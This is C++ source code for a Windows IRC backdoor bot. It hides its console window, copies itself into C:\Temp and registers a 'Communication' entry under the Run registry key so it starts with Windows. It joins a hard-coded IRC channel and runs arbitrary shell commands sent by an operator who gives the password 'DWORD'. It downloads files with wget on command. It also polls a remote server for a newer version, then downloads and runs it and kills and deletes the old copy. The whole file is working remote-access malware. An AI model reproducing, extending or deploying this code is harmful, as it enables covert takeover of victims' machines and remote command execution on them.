

#include <string>

#include <boost/asio.hpp>

#ifdef D_LIB
#include <dlib/all/source.cpp>
#endif


#include <iostream>
#include <istream>
#include <ostream>
#include <fstream>

#ifdef D_LIB
#include <dlib/logger.h>
#endif

#include <windows.h>
#include <time.h>
#include <process.h>
#include <tchar.h>
#include <sstream>
#define nln "\n"

#include <cstdlib>
#include <pthread.h>

#define NUM_THREADS     1


#include <rapidxml_utils.hpp>
#include <rapidxml_print.hpp>


using boost::asio::ip::tcp;

#ifdef D_LIB
using namespace dlib;
using namespace std;
#endif




#ifdef D_LIB
logger logcmd("cmd");
logger logCompname("Compname");
logger logdownload("download");
logger logFilecopier("Filecopier");
logger logfindassign("findassign");
logger logircConnect("ircConnect");
logger logmain("main");
logger logSplitfilename("Splitfilename");
logger logStealth("Stealth");
logger logThread("Threading");
logger logStartupKey("StartupKey");
logger logDownload_Updates("Download_Updates");
logger logxmlparser("xmlparser");
logger logCheck_Updates("Check_Updates");
#endif


boost::asio::io_service io_service;
boost::asio::streambuf request;
boost::asio::streambuf response;



TCHAR nameBuf[MAX_COMPUTERNAME_LENGTH + 2];
DWORD nameBufSize;

void Compname(void);
void Verbose(int);
void cmd(void);
void Stealth(int x);


int sec,r,x,found,found2,found3,found4,found5,found6,found7,found8,found9,verb1=6,passwords=0;

void Download_Updates(void);



string address,name,former_app_name,irc_s_name;
std::string total,file2,path,resev,l,cont(""),MESSAGE,HOST,channel,
IDENT=("maubsdadffot"),REALNAME=("kebeqcn"),NICK=("Maysqeqehry"),str1 ("PING :"+HOST),comd,E,F,Z,q,msg,channel2="Pho_enix :",version=("1.3"),str=("PRIVMSG ");


char *writable;
size_t starting_index = 0;
std::string const LETTERS ="abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLNMOPQRSTUVWXYZ",NUMBERS = "0123456789";

void send_data()
{

}



void IrcConnect(std::string HOST,std::string channel )
{
        #ifdef D_LIB
        logircConnect << LINFO << "Has been started ";
        logircConnect << LINFO <<"Params IrcConnect("<<HOST<<","<<channel<<")";
        #endif

            std::ostream request_stream(&request);
            std::string REALNAME=("kebeqcn");

            tcp::resolver resolver(io_service);
            tcp::resolver::query query(HOST, "6667");
        #ifdef D_LIB
        logircConnect << LDEBUG << "Connecting to Host: "<<HOST;
        #endif
            tcp::resolver::iterator endpoint_iterator = resolver.resolve(query);
            tcp::socket socket(io_service);
            boost::asio::connect(socket, endpoint_iterator);

            NICK=nameBuf;
            //Form request stream
        {
        #ifdef D_LIB
        logircConnect << LINFO << "Forming Request stream";
        #endif
                boost::asio::write(socket, request);
                #ifdef D_LIB
                logircConnect << LDEBUG << "Sending :NICK "<<NICK;
                #endif
                request_stream << "NICK "<<NICK<<"\r\n";
                boost::asio::write(socket, request);
                request_stream << "USER guest tolmoon tolsun :"<<REALNAME<<"\r\n";
                boost::asio::write(socket, request);
                request_stream << "JOIN  "<<"#"<<channel<<"\r\n";

        #ifdef D_LIB
         logircConnect << LDEBUG << "Sending \\join "<<"#"<<channel;
        #endif
         #ifdef D_LIB
         logircConnect << LDEBUG<<"Sending request stream";
         #endif
                boost::asio::write(socket, request);

        }

        {
        boost::system::error_code error;
        #ifdef D_LIB
            logircConnect << LINFO << "Receiving data from "<<HOST;
        #endif
            while (boost::asio::read(socket, response,boost::asio::transfer_at_least(1), error))
                    {
                    std::istream response_stream(&response);
                        while (response_stream)
                                {
                            while (std::getline(response_stream, resev) && resev !="\r\n")
                                    {
                                        //std::cout<<resev<<std::endl;
                                        #ifdef D_LIB
                                        logircConnect << LDEBUG <<"************************************************ \n"<<resev<<" \n";
                                        logircConnect << LDEBUG <<resev.length()<<" Bytes.\n";

                                        #endif
                                        int ping=resev.find("PING",starting_index);
                                        if (ping!=-1)
                                                {
                                                    #ifdef D_LIB
                                                    logircConnect << LDEBUG << "Sending Pong  to: "<<HOST;
                                                    #endif
                                                    request_stream << "PONG "<<HOST<<"\r\n";
                                                    boost::asio::write(socket, request);
                                                }

                                        //Rem to change this to come after while loop
                                        std::string message=resev;
                                        std::string valid=(str+NICK+" :");
                                        int f =message.find(valid,starting_index);
                                        if (f!=-1)
                                                {
                                                    cont=message.substr(f+valid.length());
                                        #ifdef D_LIB
                                        logircConnect << LDEBUG << "Assigning relayed message";
                                        #endif
                                                    cmd();
                                                    if (msg.length()>1)
                                                        {
                                                            #ifdef D_LIB
                                                            logircConnect << LDEBUG<< "Sending response msg";
                                                            #endif


                                                            request_stream << msg<<"\r\n";
                                                            boost::asio::write(socket, request);
                                                            request.data();


                                                            #ifdef D_LIB
                                                            logircConnect << LDEBUG << "Clearing msg object";
                                                            #endif
                                                            msg.clear();
                                                        }
                                                }
                                        message.clear();
                                        /*end of commands*/


                                }

                            }
                }

        }

//catch comes here
}


void SplitFilename (const std::string& str)
{
    #ifdef D_LIB
    logSplitfilename << LINFO <<"Called with :"<<str<<" Params";
    #endif
        unsigned found = str.find_last_of("/\\");
        path=(str.substr(0,found)+("\\")) ;
        file2=(str.substr(found+1));
    #ifdef D_LIB
    logSplitfilename << LDEBUG << "Path is: "<<path<<" "<<"Filename is :"<<file2;
    #endif
}

int FileCopier(std::string sourcefile,std::string targetfilename,std::string targetdir)
{
    #ifdef D_LIB
    logFilecopier << LINFO << "Called with :"<<sourcefile<<" :"<<targetfilename<<" :"<<targetdir;
    #endif
        if (CreateDirectory (targetdir.c_str(), NULL),false)
                {
    #ifdef D_LIB
    logFilecopier << LWARN << "Failed to create dir :"<<targetdir;
    #endif
                }
        else
            ;
        std::string target=(targetdir+"\\"+targetfilename);
        if(CopyFile (sourcefile.c_str(), target.c_str(), false))
                {
     #ifdef D_LIB
    logFilecopier << LINFO << ":"<<sourcefile<<": copied successfully ";
    #endif
                }
        else
            {
     #ifdef D_LIB
    logFilecopier << LWARN<< "! :"<<sourcefile<<" Failed to copy";
    #endif
            }

return 0;
}
int findforme(std::string content,std::string str)
{
        int starting_index=0;
        int findings = content.find(str,starting_index);
        return findings;
}


int findassing(std::string beginsat,std::string content,std::string recipent)
{
    #ifdef D_LIB
    logfindassign<< LINFO << "Called with :"<<beginsat<<":"<<content<<":"<<recipent;
    #endif // D_LIB
        int starting_index=0;
        int index=0;
        index=content.find(beginsat.c_str(),starting_index);
        if (index>=0)
            {
                recipent.assign(content,index+beginsat.length(),content.length());
            }

        if (index>=0)
                return index;
        else
                return 0;
    #ifdef D_LIB
    logfindassign<< LINFO << "Exiting";
    #endif // D_LIB
}
 #ifdef D_LIB
void setup_loggers (int level)
{

    if (level==0)
    {
        logcmd.set_level(LFATAL);
        logCompname.set_level(LFATAL);
        logdownload.set_level(LFATAL);
        logFilecopier.set_level(LFATAL);
        logfindassign.set_level(LFATAL);
        logircConnect.set_level(LFATAL);
        logmain.set_level(LFATAL);
        logSplitfilename.set_level(LFATAL);
        logStealth.set_level(LFATAL);
        logThread.set_level(LFATAL);
        logStartupKey.set_level(LFATAL);
        logDownload_Updates.set_level(LFATAL);
        logxmlparser.set_level(LFATAL);
        logCheck_Updates.set_level(LFATAL);

    }

    if (level==1)
    {
        logcmd.set_level(LWARN);
        logCompname.set_level(LWARN);
        logdownload.set_level(LWARN);
        logFilecopier.set_level(LWARN);
        logfindassign.set_level(LWARN);
        logircConnect.set_level(LWARN);
        logmain.set_level(LWARN);
        logSplitfilename.set_level(LWARN);
        logStealth.set_level(LWARN);
        logThread.set_level(LWARN);
        logStartupKey.set_level(LWARN);
        logDownload_Updates.set_level(LWARN);
        logxmlparser.set_level(LWARN);
        logCheck_Updates.set_level(LWARN);

    }
    else if (level==2)
    {
       logcmd.set_level(LINFO);
        logCompname.set_level(LINFO);
        logdownload.set_level(LINFO);
        logFilecopier.set_level(LINFO);
        logfindassign.set_level(LINFO);
        logircConnect.set_level(LINFO);
        logmain.set_level(LINFO);
        logSplitfilename.set_level(LINFO);
        logStealth.set_level(LINFO);
        logThread.set_level(LINFO);
        logStartupKey.set_level(LINFO);
        logDownload_Updates.set_level(LINFO);
        logxmlparser.set_level(LINFO);
        logCheck_Updates.set_level(LINFO);
    }
        else if (level==3)
    {
        logcmd.set_level(LDEBUG);
        logCompname.set_level(LDEBUG);
        logdownload.set_level(LDEBUG);
        logFilecopier.set_level(LDEBUG);
        logfindassign.set_level(LDEBUG);
        logircConnect.set_level(LDEBUG);
        logmain.set_level(LDEBUG);
        logSplitfilename.set_level(LDEBUG);
        logStealth.set_level(LDEBUG);
        logThread.set_level(LDEBUG);
        logStartupKey.set_level(LDEBUG);
        logDownload_Updates.set_level(LDEBUG);
        logCheck_Updates.set_level(LDEBUG);
    }
        else if (level==4)
    {
       logcmd.set_level(LTRACE);
        logCompname.set_level(LTRACE);
        logdownload.set_level(LTRACE);
        logFilecopier.set_level(LTRACE);
        logfindassign.set_level(LTRACE);
        logircConnect.set_level(LTRACE);
        logmain.set_level(LTRACE);
        logSplitfilename.set_level(LTRACE);
        logStealth.set_level(LTRACE);
        logThread.set_level(LTRACE);
        logStartupKey.set_level(LTRACE);
        logDownload_Updates.set_level(LTRACE);
        logxmlparser.set_level(LTRACE);
        logCheck_Updates.set_level(LTRACE);
    }
        else if (level==5)
    {
        logcmd.set_level(LALL);
        logCompname.set_level(LALL);
        logdownload.set_level(LALL);
        logFilecopier.set_level(LALL);
        logfindassign.set_level(LALL);
        logircConnect.set_level(LALL);
        logmain.set_level(LALL);
        logSplitfilename.set_level(LALL);
        logStealth.set_level(LALL);
        logThread.set_level(LALL);
        logStartupKey.set_level(LALL);
        logDownload_Updates.set_level(LALL);
        logxmlparser.set_level(LALL);
        logCheck_Updates.set_level(LALL);
    }
    if (level>=6)
    {
        verb1=0;
    }

}
#endif // D_LIB

void Verbose(int v)
{
#ifdef D_LIB

setup_loggers(v);

#endif // D_LIB

}

void download (void)
{
    #ifdef D_LIB
    logdownload<< LINFO << "Started";
    logdownload<< LDEBUG<< "Calling system with :"<<total<<" params";
    #endif // D_LIB
        system(total.c_str());
    #ifdef D_LIB
    logdownload<< LINFO << "exiting";
    #endif // D_LIB
}

void Stealth(int x)
{
    #ifdef D_LIB
    logStealth<< LINFO << "Started";
    logStealth<<LINFO << "Switching the display mode";
     #endif // D_LIB
        HWND Stealth;
        AllocConsole();
        Stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(Stealth,x);/*show console app 1*/
        #ifdef D_LIB
        if (x==1)
            logStealth<< LDEBUG<<"Console Display mode is On";
        else
    logStealth<< LDEBUG<<"Console Display mode is Off";
    #endif // D_LIB
}

void cmd(void)
{
    #ifdef D_LIB
    logcmd<<LINFO << "Started";
    #endif // D_LIB
            found= cont.find("cmd");
            found2= cont.find("download");
            found3= cont.find("display");
            found4= cont.find("exit");
            found5=cont.find("Operater");
            found6=cont.find("Version");
            found7=cont.find("Kick");
            found8=cont.find("Password");
            found9=cont.find("Help");
     #ifdef D_LIB
    logcmd<<LDEBUG <<"Finished assigning find vars";
    #endif // D_LIB
    if (passwords ==1)
        {
        if (found!=-1)
            {
                #ifdef D_LIB
                logcmd<<LINFO <<"Inside cmd found";
                #endif // D_LIB
                std::cout<<"cmd is at"<<found<<std::endl;std::cout<<"size of cont is "<<cont.length()<<std::endl;
                comd= cont.substr(found+3);
                char * writable = new char[comd.size() + 1];
                copy(comd.begin(), comd.end(), writable);
                writable[comd.size()] = '\0';
                #ifdef D_LIB
                logcmd<<LDEBUG <<"Calling system with :"<<writable<<" params";
                #endif // D_LIB
                system(writable);
                #ifdef D_LIB
                logcmd<<LDEBUG <<"Sytem run commands are :"<<comd;
                #endif // D_LIB

            }
        if (found2!=-1)
            {
                #ifdef D_LIB
                logcmd<<LINFO <<"Inside download found 2";
                #endif // D_LIB
                /*update*/
                int f =cont.find("http",starting_index);
                int dl =cont.find("filename",starting_index);
                if (f!=-1)
                        {
                            E.assign(cont,f,cont.length());
                        }
                if (dl!=-1)
                        {
                            q.assign(cont,dl+9,cont.length());
                        }
                 #ifdef D_LIB
                logcmd<<LINFO <<"Completed http & filename finder";
                #endif // D_LIB
                if (E.length()>1&&q.length()>1)
                        {
                            std::string::size_type i = 0;
                            #ifdef D_LIB
                            logcmd<<LINFO <<"Inside download name assignment";
                            #endif // D_LIB
                            i = q.find('\r', i);
                            q.erase(i);
                            total ="wget "+E+" "+q;
                            #ifdef D_LIB
                            logcmd<<LINFO <<"Completed download name assignment with :"<<total<<" params";
                            #endif // D_LIB
                            download();
                            E.clear();
                            q.clear();
                            total.clear();
                        }
                }
        if (found3!=-1)
                {
                    #ifdef D_LIB
                    logcmd<<LINFO <<"Inside found 3 displaying the console window";
                     #endif // D_LIB
                    /*display*/
                    if(verb1>6)
                        verb1=0;
                    else
                        verb1++;
                    #ifdef D_LIB
                    logcmd<<LDEBUG<<"Verb1 is"<<verb1;
                    #endif // D_LIB
                    Verbose(verb1);
                    Stealth(1);

                }
        if (found4!=-1)
                {
                     #ifdef D_LIB
                    logcmd<<LDEBUG <<"Inside found 4 exiting....."<<verb1<<" params";
                     #endif // D_LIB
                    /*quit*/
                    exit(1);
                }
        if (found5!=-1)
                {
                    #ifdef D_LIB
                    logcmd<<LINFO <<"Inside found 5 sending Operater message";
                    #endif // D_LIB
                    /*msg*/
                    int f =cont.find("Operater",starting_index);
                    if (f!=-1)
                        {
                            std::string oper;
                            oper.assign(cont,f+9,cont.length());
                            msg=("MODE "+channel+" +o "+oper);
                             #ifdef D_LIB
                            logcmd<<LDEBUG <<"Creating operater with :"<<msg<<"params";
                            #endif // D_LIB
                        }
                }
        if (found6!=-1)
                {
                    #ifdef D_LIB
                    logcmd<<LINFO <<"Inside found 6 sending version string";
                    #endif // D_LIB
                    /*msg*/
                    msg=("PRIVMSG "+channel2)+version;
                    #ifdef D_LIB
                    logcmd<<LDEBUG <<"Version string :"<<msg;
                    #endif // D_LIB
                }
        if (found7!=-1)
                {
                #ifdef D_LIB
                logcmd<<LINFO <<"Inside found 7 sending kick string";
/*msg*/         #endif // D_LIB
                int f =cont.find("Kick",starting_index);
                if (f!=-1)
                        {
                            std::string kiked;
                            kiked.assign(cont,f+5,cont.length());
                            msg=("Kick "+channel+" "+kiked);
                            #ifdef D_LIB
                            logcmd<<LDEBUG <<"Kick string :"<<msg;
                             #endif // D_LIB
                        }

                    }
                if (found9!=-1)
                    {
                        #ifdef D_LIB
                        logcmd<<LINFO <<"Inside found 7 sending version string";
                        #endif // D_LIB
                        msg=("PRIVMSG "+channel2)+"Available Commands : cmd dir , Operater nick , Version , cmd wget address , display , Kick nick and Help to display this menu";

                        #ifdef D_LIB
                        logcmd<<LDEBUG<<"sending usage msg :"<<msg;
                        #endif // D_LIB
                    }
            }
    else
        msg=("PRIVMSG "+channel2)+"Enter password to continue.....";
            #ifdef D_LIB
            logcmd<<LDEBUG <<"Sending password wrng msg :"<<msg;
            #endif // D_LIB
                if (found8!=-1)
                    {
                        #ifdef D_LIB
                        logcmd<<LINFO <<"Password Checker string";
                        #endif // D_LIB
                        //Almost got mixed up just type in :Password DWORD
                        int x=cont.find ("DWORD");
                        if (x<0)
                        {
                            msg=("PRIVMSG "+channel2)+"Wrong password please try again";
                            #ifdef D_LIB
                            logcmd<<LDEBUG <<"Sending wrong password msg"<<msg;
                            #endif // D_LIB
                            passwords=0;
                        }
                        else if (x>=0)
                        {
                            msg=("PRIVMSG "+channel2)+"Correct password welcome";
                             #ifdef D_LIB
                            logcmd<<LDEBUG <<"Sending correct password msg :"<<msg;
                            #endif // D_LIB
                            passwords=1;

                        }
                x=0;
                    }
        #ifdef D_LIB
        logcmd<<LINFO <<"Clearing (cont & MESSAG) ";
        #endif // D_LIB
        MESSAGE.clear();
        cont.clear();
        #ifdef D_LIB
        logcmd<<LINFO <<"Exiting found ";
        #endif // D_LIB
}

void Compname(void)
{
#ifdef D_LIB
logCompname<<LINFO <<" :Started logging.";
#endif // D_LIB
    nameBufSize = sizeof nameBuf - 1;
        if (GetComputerName(nameBuf, &nameBufSize) == TRUE)
            {
            #ifdef D_LIB
            logCompname<<LINFO <<" :Assigned Computer name :"<<nameBuf;
            #endif
            }
#ifdef D_LIB
logCompname<<LINFO <<" :Exiting";
#endif // D_LIB
}

void start_reg()
{

    HKEY softwareKey;
	HKEY thisKey;
	HKEY schemeKey;
	DWORD dwKeyValue;
	DWORD dwKeyType;
	DWORD dwKeyValueSize;
	char cKeyValue[1024];
    dwKeyValue = 1024;
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    //exit(1);
std::string pth="C:\\Temp\\";
 file2=(pth+file2);
_tcscpy(szPath, _T(file2.c_str()));
pathLen = _tcslen(szPath);

HKEY newValue;
if (RegOpenKey(HKEY_CURRENT_USER,
    TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
    &newValue) != ERROR_SUCCESS)
{
    #ifdef D_LIB
    logStartupKey<<LDEBUG<<"Failure in oppening  key";
    logStartupKey<<LFATAL << "Error:unable to create value in registry";
    #endif
}
DWORD pathLenInBytes = pathLen * sizeof(*szPath);
if (RegSetValueEx(newValue,
    TEXT("Communication"),
    0,
    REG_SZ,
    (LPBYTE)szPath,
    pathLenInBytes) != ERROR_SUCCESS)
{
    RegCloseKey(newValue);
    #ifdef D_LIB
    logStartupKey<<LDEBUG<<"Failure in closing registry";
    #endif
}
RegCloseKey(newValue);


}

int xmlparser(char* filename)
{
#ifdef D_LIB
logxmlparser<<LINFO <<" :Started logging.";
#endif

ifstream myfile(filename);

#ifdef D_LIB
logxmlparser<<LDEBUG <<" :Received Filename:"<<filename;
#endif
using namespace rapidxml;
using namespace std;

rapidxml::xml_document<> doc;

/* "Read file into vector<char>" See linked thread above*/
std::vector<char> buffer((istreambuf_iterator<char>(myfile)), istreambuf_iterator<char>( ));

buffer.push_back('\0');

//cout<<&buffer[0]<<endl; /*test the buffer */
doc.parse<parse_declaration_node | parse_no_data_nodes>(&buffer[0]);
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
string encoding = doc.first_node()->first_attribute("encoding")->value();
// encoding == "utf-8"
#ifdef D_LIB
logxmlparser<<LDEBUG <<" :XML NODE encoding: "<<encoding;
#endif
// we didn't keep track of our previous traversal, so let's start again
// we can match nodes by name, skipping the xml declaration entirely
xml_node<>* cur_node = doc.first_node("current");
string version_ret = cur_node->first_attribute("version")->value();
// rootnode_type == "example"
#ifdef D_LIB
logxmlparser<<LDEBUG <<" :XML NODE Version: "<<version_ret;
#endif
// go straight to the first evendeepernode
cur_node = cur_node->first_node("server")->first_node("name");
name = cur_node->first_attribute("host")->value();
address = cur_node->first_attribute("addr")->value();
// attr2 == "dog"
#ifdef D_LIB
logxmlparser<<LDEBUG <<" :XML HostName: "<<name;
#endif

#ifdef D_LIB
logxmlparser<<LDEBUG <<" :XML Filepath: "<<address;
#endif
// and then to the second evendeepernode

cur_node = cur_node->next_sibling("previous");
former_app_name=cur_node->first_attribute("appname")->value();
#ifdef D_LIB
logxmlparser<<LDEBUG <<" :XML DownloadFile: "<<address;
#endif

irc_s_name=cur_node->first_attribute("ircserver")->value();
#ifdef D_LIB
logxmlparser<<LDEBUG <<" :XML filename: "<<irc_s_name;
#endif


std::string::size_type sz;     // alias of size_t
double version_retrived = atof (version_ret.c_str());
double version_local = atof (version.c_str());

if (version_retrived>version_local)
    {
    #ifdef D_LIB
    logxmlparser<<LINFO<<"Downloading Update";
    logxmlparser<<LDEBUG<<"Former app name"<<former_app_name;
    logxmlparser<<LDEBUG<<"Updates Server address :"<<name<<"\\"<<address;
    #endif
    Download_Updates();
    }
else
    {
     logxmlparser<<LINFO<<"Version Ok";
      logxmlparser<<LINFO<<"Skipping download";
    }


////////////////////////////////////////


///////////////////////////////////////

return 0;
}
void *Check_Updates(void *threadid)
{
   long tid;
   tid = (long)threadid;
   logThread<<LDEBUG <<  "Started Update checker";
#ifdef D_LIB
logCheck_Updates<<LINFO <<" :Started logging.";
#endif
   ///////////////////////////////////////////////////////

using namespace rapidxml;
string Host="digital-dragons.net";
string Get_Request="/current.xml";

try
{

boost::asio::io_service io_service;

// Get a list of endpoints corresponding to the server name.
tcp::resolver resolver(io_service);
tcp::resolver::query query(Host, "http");
tcp::resolver::iterator endpoint_iterator = resolver.resolve(query);
tcp::resolver::iterator end;

// Try each endpoint until we successfully establish a connection.
tcp::socket socket(io_service);
boost::system::error_code error = boost::asio::error::host_not_found;
while (error && endpoint_iterator != end)
{
socket.close();
socket.connect(*endpoint_iterator++, error);
}
if (error)
throw boost::system::system_error(error);

// Form the request. We specify the "Connection: close" header so that the
// server will close the socket after transmitting the response. This will
// allow us to treat all data up until the EOF as the content.
boost::asio::streambuf request;
std::ostream request_stream(&request);
#ifdef D_LIB
logCheck_Updates<<LINFO <<" :Sending current.xml request.";
#endif
request_stream << "GET " << Get_Request << " HTTP/1.0\r\n";
request_stream << "Host: " << Host << "\r\n";
request_stream << "Accept: */*\r\n";
request_stream << "Connection: close\r\n\r\n";

// Send the request.
boost::asio::write(socket, request);

// Read the response status line. The response streambuf will automatically
// grow to accommodate the entire line. The growth may be limited by passing
// a maximum size to the streambuf constructor.
boost::asio::streambuf response;
boost::asio::read_until(socket, response, "\r\n");

// Check that response is OK.
std::istream response_stream(&response);
std::string http_version;
response_stream >> http_version;
unsigned int status_code;
response_stream >> status_code;
std::string status_message;
std::getline(response_stream, status_message);
if (!response_stream || http_version.substr(0, 5) != "HTTP/")
{

#ifdef D_LIB
logCheck_Updates<<LWARN << "Invalid response\n";
#endif
;
}
if (status_code != 200)
{

#ifdef D_LIB
logCheck_Updates<<LWARN << "Response returned with status code :" << status_code ;
#endif
;
}

// Read the response headers, which are terminated by a blank line.
boost::asio::read_until(socket, response, "\r\n\r\n");

// Process the response headers.
std::string header;
while (std::getline(response_stream, header) && header != "\r")
//std::cout << header << "\n";
//std::cout << "\n";
{
#ifdef D_LIB
logCheck_Updates<<LDEBUG<< header ;
#endif
;
}


// Write whatever content we already have to output.
/**
if (response.size() > 0)
std::cout << &response;
**/
// Read until EOF, writing data to output as we go.
while (boost::asio::read(socket, response,
boost::asio::transfer_at_least(1), error))
//std::cout << &response;
;

std::string response_final,final_data;
std::istream response_data(&response);

while(response_stream.good())
{
std::getline(response_stream, response_final);
final_data+= (response_final);
response_final.clear();
}
//std::cout<<final_data;
ofstream write("somefile.xml");
write<<final_data;
write.close();

if (error != boost::asio::error::eof)
throw boost::system::system_error(error);


if (final_data.length()>4)
{
    xmlparser("somefile.xml");
    #ifdef D_LIB
    logCheck_Updates<<LDEBUG<< "Length of data received, Satisfiable :" << final_data.length() ;
    #endif
}
   ////////////////////////////////////////////////////////
    #ifdef D_LIB
    logCheck_Updates<<LINFO<< "Closing Thread." ;
    #endif
                } catch (const std::exception& ex) {
// ...
                } catch (const std::string& ex) {
                // ...
                } catch (...) {
                // ...
                }
   pthread_exit(NULL);
}
void Download_Updates(void)
{
#ifdef D_LIB
logDownload_Updates<<LINFO<< " :Started.";
#endif
   ///////////////////////////////////////////////////////

string Host=name;
string slash="/";
string Get_Request=name+slash+address;
string wget="wget.exe "+Get_Request;
string del="del ";
string kill="taskkill /f /im ";
string start="start ";
start=start+address;
kill=(kill+former_app_name);
del=(del+former_app_name);



#ifdef D_LIB
logDownload_Updates<<LDEBUG<< " :Downloading update :"<<wget;
#endif
system(wget.c_str());
#ifdef D_LIB
logDownload_Updates<<LDEBUG<< " :Running Update :"<<start;
#endif
system(start.c_str());
#ifdef D_LIB
logDownload_Updates<<LDEBUG<< " :Killing former App :"<<kill;
#endif
system(kill.c_str());
#ifdef D_LIB
logDownload_Updates<<LDEBUG<< " :Deleting former App :"<<del;
#endif

system(del.c_str());


}




int main(int argc, char *argv[])
{
#ifdef D_LIB
std::ofstream os("logger.txt", std::ios_base::out);
set_all_logging_output_streams (os);
#endif // D_LIB
Stealth(0);
Verbose(5);
#ifdef D_LIB
logmain<<LINFO <<"Started";
#endif // D_LIB


channel="kens";



    SplitFilename(argv[0]);
    if(path!="C:\\Temp\\")
        {

            FileCopier(file2,file2,"C:\\Temp\\");
            FileCopier("libgcc_s_dw2-1.dll","libgcc_s_dw2-1.dll","C:\\Temp\\");
            FileCopier("libstdc++-6.dll","libstdc++-6.dll","C:\\Temp\\");
            FileCopier("wget.exe","wget.exe","C:\\Temp\\");
            FileCopier("pthreadGC2.dll","pthreadGC2.dll","C:\\Temp\\");

            //FileCopier("libidn-11.dll","libidn-11.dll","C:\\Temp\\");
            //FileCopier("libintl-8.dll","libintl-8.dll","C:\\Temp\\");
            //FileCopier("libnettle-4-3.dll","libnettle-4-3.dll","C:\\Temp\\");
            //FileCopier("libp11-kit-0.dll","libp11-kit-0.dll","C:\\Temp\\");

            //FileCopier("zlib1.dll","zlib1.dll","C:\\Temp\\");
            //FileCopier("libiconv-2.dll","libiconv-2.dll","C:\\Temp\\");
        }
start_reg();


//system("taskkill /f /im Communication.exe");


///////////////////////////////Multi-threading/////////////////////////////////
pthread_t threads[NUM_THREADS];
int rc;
int i=1;
    #ifdef D_LIB
    logmain<<LINFO<< "main() : creating thread, " << i;
    #endif // D_LIB
      rc = pthread_create(&threads[i], NULL,
                          Check_Updates, (void *)i);
            pthread_detach(threads[i]);
      if (rc){
        #ifdef D_LIB
        logmain<<LFATAL << "Error:unable to create thread," << rc ;
       #endif // D_LIB
      }
///////////////////////////////Multi-threading/////////////////////////////////

    Compname();
    int times=0;
    while (1)
            {
    #ifdef D_LIB
    logmain<<LINFO <<"Inside while loop";
    #endif // D_LIB
            try{
                 HOST=irc_s_name;


                if(HOST.length()<= 0)
                {
                    #ifdef D_LIB
                    logmain<<LDEBUG <<"Trial No."<<times;
                    #endif // D_LIB
                   if (times>=6)
                        {

                            HOST="punch.wa.us.dal.net";
                            #ifdef D_LIB
                             logmain<<LDEBUG <<"Received host name :"<<HOST;
                             #endif // D_LIB
                            times=0;
                        }
                    times++;
                }

               if(HOST.length()>= 1)
                 {
                     IrcConnect(HOST,channel);
                 }
                 else
                    #ifdef D_LIB
                    logmain<<LDEBUG <<"No host name Received !";
                    #endif // D_LIB
                } catch (const std::exception& ex) {
// ...
                } catch (const std::string& ex) {
                // ...
                } catch (...) {
                // ...
                }
    #ifdef D_LIB
    logmain<<LINFO <<"Sleeping for 6 seconds";
    #endif // D_LIB
    Sleep(6000);
                }
return 0;
}
